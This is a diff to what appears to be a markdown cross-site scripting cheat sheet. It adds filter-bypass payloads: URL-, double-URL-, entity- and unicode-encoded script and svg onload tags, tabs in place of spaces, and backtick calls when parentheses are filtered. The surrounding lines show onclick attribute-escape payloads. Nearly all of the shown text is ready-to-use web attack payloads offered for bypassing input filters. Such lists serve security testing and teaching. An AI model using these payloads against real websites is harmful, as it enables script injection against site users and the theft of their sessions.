@@ -15,7 +15,7 @@ Or try to replace " with \u0022, > with \u003e and < with \u003c. So the payload
 
 ### 2.If you can escape from the attribute but not from the tag (> is encoded or deleted)
 
-Try to use this payloads :
+Try to event handlers :
 ```
 1) <input   value"XXXXXXX"   onclick=alert(1)  >Click</input>
 
@@ -27,7 +27,16 @@ Try to use this payloads :
 
 5) <a  href=https://google.com onclick=alert(document.location.hash.substring(1))#{saasasasas}>Click</a>
 ```
+or use encodes:
+```
+%3cscript%3e
+%253cscript%253e
+&lt;script&gt;
 
+%u003Csvg onload=alert(1)>
+%u3008svg onload=alert(2)> 
+%uFF1Csvg onload=alert(3)>
+```
 ### 3.If alert is encoded or deleted
 
 Try to use this payloads :
@@ -162,4 +171,19 @@ Try to use this payloads :
 
 5) <script>prompt(1)</script>
 
+```
+
+### 4.If space is encoded or deleted
+```
+use tab ;)
+```
+
+### 5.If () is encoded or deleted
+```
+<script>alert`1`</script>
+```
+
+### 5.If <script> is encoded or deleted try other tags like:
+```
+SVG, img, iframe 
 ```
